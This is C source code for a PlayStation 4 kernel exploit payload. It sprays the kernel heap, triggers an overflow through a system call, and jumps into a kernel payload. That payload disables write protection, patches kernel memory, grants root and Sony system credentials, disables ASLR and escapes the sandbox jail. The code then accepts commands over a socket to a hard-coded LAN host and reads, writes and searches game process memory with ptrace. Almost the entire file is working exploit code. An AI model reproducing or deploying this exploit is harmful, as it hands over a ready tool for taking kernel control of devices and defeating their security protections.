#include "ps4.h"

#define DEBUG_SOCKET
#include "defines.h"
#define BOOL uint8_t
#define FALSE 0
#define TRUE 1

static int sock;
static void *dump;

//Thanks to BadChoicesZ
int (*sceSysUtilSendSystemNotificationWithText)(int messageType, int userID, char* message);

void notify(char *message) {
	char buffer[512];
	sprintf(buffer, "%s\n\n\n\n\n\n\n", message);
	sceSysUtilSendSystemNotificationWithText(36, 0x10000000, buffer);
}


/*Thanks to 2much4u*/
int ptrace(int req, int pid, void* argsAddr, int data);
SYSCALL(ptrace, 26);
void PTRACE(int req, int pid, void* argsAddr, int data) {
	int ret = ptrace(req, pid, argsAddr, data);
	if (ret != 0) {
		PTRACE(req, pid, argsAddr, data);
	}
}
void procAttach(int pid) {
	PTRACE(PT_ATTACH, pid, NULL, NULL);
}
void procDetach(int pid) {
	PTRACE(PT_DETACH, pid, NULL, NULL);
}
void procReadBytes(int pid, void* offset, void* buffer, size_t len) {
	struct ptrace_io_desc pt_desc;
	pt_desc.piod_op = PIOD_READ_D;
	pt_desc.piod_addr = buffer;
	pt_desc.piod_offs = offset;
	pt_desc.piod_len = len;
	PTRACE(PT_IO, pid, &pt_desc, NULL);
}
void procWriteBytes(int pid, void* offset, void *buffer, size_t len) {
	struct ptrace_io_desc pt_desc;
	pt_desc.piod_op = PIOD_WRITE_D;
	pt_desc.piod_addr = buffer;
	pt_desc.piod_offs = offset;
	pt_desc.piod_len = len;
	PTRACE(PT_IO, pid, &pt_desc, NULL);
}


void payload(struct knote *kn) {
	struct thread *td;
	struct ucred *cred;

	// Get td pointer
	asm volatile("mov %0, %%gs:0" : "=r"(td));

	// Enable UART output
	uint16_t *securityflags = (uint16_t*)0xFFFFFFFF833242F6;
	*securityflags = *securityflags & ~(1 << 15); // bootparam_disable_console_output = 0

	// Print test message to the UART line
	printfkernel("\n\n\n\n\n\n\n\n\nHello from kernel :-)\n\n\n\n\n\n\n\n\n");

	// Disable write protection
	uint64_t cr0 = readCr0();
	writeCr0(cr0 & ~X86_CR0_WP);
	
	//Debug Settings
	// sysctl_machdep_rcmgr_debug_menu and sysctl_machdep_rcmgr_store_moe
	//*(uint16_t *)0xFFFFFFFF82607C46 = 0x9090;
	//*(uint16_t *)0xFFFFFFFF82607826 = 0x9090;
	
	*(char *)0xFFFFFFFF8332431A = 1;
	*(char *)0xFFFFFFFF83324338 = 1;
	// Disable Process ASLR - ZiL0G80
	*(uint16_t *)0xFFFFFFFF82649C9C = 0x63EB;
	//Spoof - zecoxao
	*(uint64_t *)0xFFFFFFFF8323A4E0 = 0x5550001;
	
	// Restore write protection
	writeCr0(cr0);
	
	// Resolve creds
	cred = td->td_proc->p_ucred;

	// Escalate process to root
	cred->cr_uid = 0;
	cred->cr_ruid = 0;
	cred->cr_rgid = 0;
	cred->cr_groups[0] = 0;

	void *td_ucred = *(void **)(((char *)td) + 304); // p_ucred == td_ucred
	
	// sceSblACMgrIsSystemUcred
	uint64_t *sonyCred = (uint64_t *)(((char *)td_ucred) + 96);
	*sonyCred = 0xffffffffffffffff;
	
	// sceSblACMgrGetDeviceAccessType
	uint64_t *sceProcType = (uint64_t *)(((char *)td_ucred) + 88);
	*sceProcType = 0x3801000000000013; // Max access
	
	// sceSblACMgrHasSceProcessCapability
	uint64_t *sceProcCap = (uint64_t *)(((char *)td_ucred) + 104);
	*sceProcCap = 0xffffffffffffffff; // Sce Process
	
	((uint64_t *)0xFFFFFFFF832CC2E8)[0] = 0x123456; //priv_check_cred bypass with suser_enabled=true
	((uint64_t *)0xFFFFFFFF8323DA18)[0] = 0; // bypass priv_check

	// Jailbreak ;)
	cred->cr_prison = (void *)0xFFFFFFFF83237250; //&prison0

	// Break out of the sandbox
	void *td_fdp = *(void **)(((char *)td->td_proc) + 72);
	uint64_t *td_fdp_fd_rdir = (uint64_t *)(((char *)td_fdp) + 24);
	uint64_t *td_fdp_fd_jdir = (uint64_t *)(((char *)td_fdp) + 32);
	uint64_t *rootvnode = (uint64_t *)0xFFFFFFFF832EF920;
	*td_fdp_fd_rdir = *rootvnode;
	*td_fdp_fd_jdir = *rootvnode;
}

// Perform kernel allocation aligned to 0x800 bytes
int kernelAllocation(size_t size, int fd) {
	SceKernelEqueue queue = 0;
	sceKernelCreateEqueue(&queue, "kexec");

	sceKernelAddReadEvent(queue, fd, 0, NULL);

	return queue;
}

void kernelFree(int allocation) {
	close(allocation);
}

void *exploitThread(void *none) {

	uint64_t bufferSize = 0x8000;
	uint64_t overflowSize = 0x8000;
	uint64_t copySize = bufferSize + overflowSize;
	
	// Round up to nearest multiple of PAGE_SIZE
	uint64_t mappingSize = (copySize + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
	
	uint8_t *mapping = mmap(NULL, mappingSize + PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	munmap(mapping + mappingSize, PAGE_SIZE);
	
	uint8_t *buffer = mapping + mappingSize - copySize;
	
	int64_t count = (0x100000000 + bufferSize) / 4;

	// Create structures
	struct knote kn;
	struct filterops fo;
	struct knote **overflow = (struct knote **)(buffer + bufferSize);
	overflow[2] = &kn;
	kn.kn_fop = &fo;

	// Setup trampoline to gracefully return to the calling thread
	void *trampw = NULL;
	void *trampe = NULL;
	int executableHandle;
	int writableHandle;
	uint8_t trampolinecode[] = {
		0x58, // pop rax
		0x48, 0xB8, 0x19, 0x39, 0x40, 0x82, 0xFF, 0xFF, 0xFF, 0xFF, // movabs rax, 0xffffffff82403919
		0x50, // push rax
		0x48, 0xB8, 0xBE, 0xBA, 0xAD, 0xDE, 0xDE, 0xC0, 0xAD, 0xDE, // movabs rax, 0xdeadc0dedeadbabe
		0xFF, 0xE0 // jmp rax
	};

	// Get Jit memory
	sceKernelJitCreateSharedMemory(0, PAGE_SIZE, PROT_CPU_READ | PROT_CPU_WRITE | PROT_CPU_EXEC, &executableHandle);
	sceKernelJitCreateAliasOfSharedMemory(executableHandle, PROT_CPU_READ | PROT_CPU_WRITE, &writableHandle);

	// Map r+w & r+e
	trampe = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_EXEC, MAP_SHARED, executableHandle, 0);
	trampw = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_TYPE, writableHandle, 0);

	// Copy trampoline to allocated address
	memcpy(trampw, trampolinecode, sizeof(trampolinecode));	
	*(void **)(trampw + 14) = (void *)payload;

	// Call trampoline when overflown
	fo.f_detach = trampe;

	// Start the exploit
	int sockets[0x2000];
	int allocation[50], m = 0, m2 = 0;
	int fd = (bufferSize - 0x800) / 8;

	// Create sockets
	for(int i = 0; i < 0x2000; i++) {
		sockets[i] = sceNetSocket("sss", AF_INET, SOCK_STREAM, 0);
		if(sockets[i] >= fd) {
			sockets[i + 1] = -1;
			break;
		}
	}

	// Spray the heap
	for(int i = 0; i < 50; i++) {
		allocation[i] = kernelAllocation(bufferSize, fd);
	}

	// Create hole for the system call's allocation
	m = kernelAllocation(bufferSize, fd);
	m2 = kernelAllocation(bufferSize, fd);
	kernelFree(m);

	// Perform the overflow
	syscall(597, 1, mapping, &count);

	// Execute the payload
	kernelFree(m2);
	
	// Close sockets
	for(int i = 0; i < 0x2000; i++) {
		if(sockets[i] == -1)
			break;
		sceNetSocketClose(sockets[i]);
	}
	
	// Free allocations
	for(int i = 0; i < 50; i++) {
		kernelFree(allocation[i]);
	}
	
	// Free the mapping
	munmap(mapping, mappingSize);
	
	return NULL;
}


void * dumpProcess()
{
	char buffer[1000];
	for(int i = 0; i < 200; i++) {
		int mib[4];
		size_t len;
		mib[0] = 1;
		mib[1] = 14;
		mib[2] = 1;
		mib[3] = i;
	
		if(sysctl(mib, 4, NULL, &len, NULL, 0) != -1) {
			if(len > 0) {
				void* dump = malloc(len);
				if(sysctl(mib, 4, dump, &len, NULL, 0) != -1) {
					char* name = dump + 0x1bf;
					sprintf(buffer, "[+] PID: %d | Name: %s\n", i, name);
					sceNetSend(sock, buffer, 1000, 0);
					if(strcmp(name, "eboot.bin") == 0)
					{
						printfsocket("[+]Eboot found with PID: %d\n", i);
					}
				}
				free(dump);
			}
		}
	}

	return NULL;
}

int getProcessPID(char * procName)
{
	for(int i = 0; i < 200; i++) {
		int mib[4];
		size_t len;
		mib[0] = 1;
		mib[1] = 14;
		mib[2] = 1;
		mib[3] = i;
	
		if(sysctl(mib, 4, NULL, &len, NULL, 0) != -1) {
			if(len > 0) {
				void* dump = malloc(len);
				if(sysctl(mib, 4, dump, &len, NULL, 0) != -1) {
					char* name = dump + 0x1bf;
					if(strcmp(name, procName) == 0)
					{
						return i;
					}
				}
				free(dump);
			}
		}
	}

	return 0;
}

void clean_buffer(char * buffer, int len)
{
	for(int i = 0; i < len; i++)
	{
		buffer[i] = 0;
	}
}

void deleteEnter(char * buffer, int len)
{
	int i;
	for(i = 0; i < len; i++)
	{
		if(buffer[i] == '\n')
		{
			buffer[i] = 0;
			return;
		}
	}
}


int _main(void)
{
	ScePthread thread;

	initKernel();	
	initLibc();
	initNetwork();
	initJIT();
	initPthread();

	int module;
	loadModule("libSceSysUtil.sprx", &module);
	RESOLVE(module, sceSysUtilSendSystemNotificationWithText);

#ifdef DEBUG_SOCKET
	struct sockaddr_in server;

	server.sin_len = sizeof(server);
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = IP(192, 168, 1, 38);
	server.sin_port = sceNetHtons(4321);
	memset(server.sin_zero, 0, sizeof(server.sin_zero));
	sock = sceNetSocket("debug", AF_INET, SOCK_STREAM, 0);
	sceNetConnect(sock, (struct sockaddr *)&server, sizeof(server));
	
	int flag = 1;
	sceNetSetsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char *)&flag, sizeof(int));
	
	dump = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
#endif

	// Create exploit thread
	if(scePthreadCreate(&thread, NULL, exploitThread, NULL, "exploitThread") != 0) {
		printfsocket("[-] pthread_create error\n");
		return 0;
	}

	// Wait for thread to exit
	scePthreadJoin(thread, NULL);

	// At this point we should have root and jailbreak
	if(getuid() != 0) {
		printfsocket("[-] Kernel patch failed!\n");
		sceNetSocketClose(sock);
		return 1;
	}
	printfsocket("[+] Kernel patch works!\n");

	char mens[100], offset_char[16], value_char[10], func = 'e', readed = 0, newProcess[100];
	int bytes_readed, offset, value, i, aux, j, PID = 0, PID1 = 0;
	notify("Kernel pach works!\nWainting for a game process...");
	while(PID == 0)
	{
		bytes_readed = sceNetRecv(sock, &mens, 100, 0);
		if(bytes_readed == 0)
			printfsocket("[-] Invalid process name");
		else
		{
			deleteEnter(mens, 100);
			PID = getProcessPID(mens);
			if(PID == 0)
				printfsocket("[-] Invalid process name: %s", mens);
			else
				printfsocket("[+] Payload ready!", PID);
		}
	}

	while(1)
	{
		clean_buffer(mens, 100);
		clean_buffer(value_char, 10);
		clean_buffer(offset_char, 16);
		bytes_readed = sceNetRecv(sock, &mens, 100, 0);
		if(bytes_readed == 0)
			break;
		func = mens[0];
		if(func == 'p' && mens[1] == ' ')
		{
			clean_buffer(newProcess, 100);
			for(i = 2 ; i < 100; i++)
			{
				if(mens[i] == '\n')
					break;
				newProcess[i -2] = mens[i];
			}
			PID1 = getProcessPID(newProcess);
			if(PID1 == 0)
				printfsocket("Invalid process name %s", newProcess);
			else
			{
				printfsocket("Process %s ready!", newProcess);
				PID = PID1;
			}

		}
		else if((func == 'w' || func == 'r' || func == 'u' || func == 'd') && mens[1] == ' ' && mens[2] == '0' && (mens[3] == 'x' || mens[3] == 'X'))
		{

			for(i = 2; i < 100; i++)
			{
				if(mens[i] == '\n' || mens[i] == 0 || mens[i] == ' ')
					break;
				offset_char[i - 2] = mens[i];
			}
			int check = sscanf(offset_char, "0x%x", &offset);
			if(check == -1)
			{
				printfsocket("Error in offset...");
			}
			else
			{
				if(func == 'w')
				{
					i++;
					aux = i;
					for(; i < 100; i++)
					{
						if(mens[i] == '\n' || mens[i] == 0 || mens[i] == ' ')
							break;
						value_char[i - aux] = mens[i];
					}
					if(value_char[0] == '0' && value_char[1] == 'x')
					{
						check = sscanf(value_char, "0x%x", &value);
						if(check == -1)
						{
							printfsocket("Error in value...");
						}
						else
						{
							clean_buffer(mens, 100);
							procAttach(PID);
							procWriteBytes(PID, (void *)offset, (void *)&value, sizeof(char));
							procDetach(PID);
							sprintf(mens, "Writted...");
							sceNetSend(sock, mens, 100, 0);
						}
					}
					else
					{
						printfsocket("Error in value...");
					}
				}
				else if(func == 'r')
				{
					clean_buffer(mens, 100);
					procAttach(PID);
					procReadBytes(PID, (void*)offset, (void*)&readed, sizeof(char));
					procDetach(PID);
					sprintf(mens, "0x%x: 0x%x", offset, readed);
					sceNetSend(sock, mens, 100, 0);
				}
				else if(func == 'u')
				{
					i++;
					aux = i;
					for(; i < 100; i++)
					{
						if(mens[i] == '\n' || mens[i] == 0 || mens[i] == ' ')
							break;
						value_char[i - aux] = mens[i];
					}
					if(value_char[0] == '0' && value_char[1] == 'x')
					{
						check = sscanf(value_char, "0x%x", &value);
						if(check == -1)
						{
								printfsocket("Error in value...");
						}
						else
						{
							clean_buffer(mens, 100);
							procAttach(PID);
							for(j = 0; j < 0x1001 ; j++)
							{
								procReadBytes(PID, (void*)offset + j, (void*)&readed, sizeof(char));
								if(readed == value)
									break;
							}
							procDetach(PID);
							if(j == 0x1001)
							{
								printfsocket("Value not found");
							}
							else
							{
								sprintf(mens, "Value found in: 0x%x", offset - j);
								sceNetSend(sock, mens, 100, 0);
							}
						}
					}
					else
					{
						printfsocket("Error in value...");
					}
					
				}
				else if(func == 'd')
				{
					i++;
					aux = i;
					for(; i < 100; i++)
					{
						if(mens[i] == '\n' || mens[i] == 0 || mens[i] == ' ')
							break;
						value_char[i - aux] = mens[i];
					}
					if(value_char[0] == '0' && value_char[1] == 'x')
					{
						check = sscanf(value_char, "0x%x", &value);
						if(check == -1)
						{
							printfsocket("Error in value...");
						}
						else
						{
							clean_buffer(mens, 100);
							procAttach(PID);
							for(j = 0; j < 0x1001 ; j++)
							{
								procReadBytes(PID, (void*)offset - j, (void*)&readed, sizeof(char));
								if(readed == value)
									break;
							}
							procDetach(PID);
							if(j == 0x1001)
							{
								printfsocket("Value not found");
							}
							else
							{
								sprintf(mens, "Value found in: 0x%x", offset - j);
								sceNetSend(sock, mens, 100, 0);
							}
						}
					}
					else
					{
						printfsocket("Error in value...");
					}
				}
			}
		}
		else
		{
			printfsocket("Invalid command...");
		}
	}
	
#ifdef DEBUG_SOCKET
	munmap(dump, PAGE_SIZE);	
#endif
	
	printfsocket("[+] bye\n");
	sceNetSocketClose(sock);
	return 0;
}